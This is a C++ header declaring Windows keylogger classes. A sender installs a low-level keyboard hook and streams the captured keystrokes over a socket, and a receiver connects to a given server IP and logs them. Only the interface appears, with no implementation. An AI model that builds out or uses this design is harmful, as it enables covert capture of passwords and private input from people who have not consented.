#pragma once

#include <string>
#include <memory>
#include <atomic>
#include <mutex>
#include <filesystem>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#include "../common/logger.h"
#include "thread_manager.h"
#include "constants.h"

class KeyloggerSender
{
public:
	KeyloggerSender(ThreadManager &threadMgr);
	~KeyloggerSender();

	bool start();
	void stop();
	bool isRunning() const { return running; }

private:
	std::atomic<bool> running;
	ThreadManager &threadManager;
	std::unique_ptr<Logger> logger;
	SOCKET keyloggerSocket;
	SOCKET serverSocket;
	std::mutex connectionMutex;
	std::filesystem::path logPath;

	void keystrokeDetectionHandler();
	void networkServerHandler();

	void cleanupSockets();
	bool initializeServerSocket();
	bool waitForClientConnection();

	void setupKeyboardHook();
	void cleanupKeyboardHook();
	void processKeystroke(DWORD vkCode, bool isKeyDown);
	void sendKeystrokeToClient(const std::string &keystroke);
	std::string resolveVirtualKey(DWORD vkCode);

	static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
	static KeyloggerSender *instance;
	static HHOOK keyboardHook;
};

class KeyloggerReceiver
{
public:
	KeyloggerReceiver(ThreadManager &threadMgr);
	~KeyloggerReceiver();

	bool start(const std::string &serverIP);
	void stop();
	bool isRunning() const { return running; }

private:
	std::atomic<bool> running;
	ThreadManager &threadManager;
	std::unique_ptr<Logger> logger;
	SOCKET keyloggerSocket;
	std::string serverIP;
	std::mutex receiveMutex;
	std::filesystem::path logPath;

	void keystrokeReceiveHandler();

	bool connectToServer();
	void cleanupSocket();
	void receiveAndLogKeystrokes();
};